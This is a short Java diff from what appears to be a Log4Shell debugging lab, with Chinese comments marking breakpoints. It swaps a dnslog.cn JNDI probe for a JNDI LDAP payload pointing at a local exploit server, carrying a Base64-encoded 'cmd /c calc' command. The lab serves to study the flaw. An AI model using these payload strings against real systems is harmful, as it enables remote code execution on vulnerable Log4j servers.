@@ -76,9 +76,9 @@ public class Log4ShellVuln {
         });
         //断点位置1，用于观察Interpolator中的内容
         String a = "${java:os}";
-        logger.error(a);
+//        logger.error(a);
 
-        String b = "${jndi:ldap://qanl3w.dnslog.cn}";
+        String b = "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y21kIC9jIGNhbGM=}";
         //断点位置2，用于观察敏感信息以及RCE（单步调试或在log4j中加入其他断点）
         logger.error(b);
 
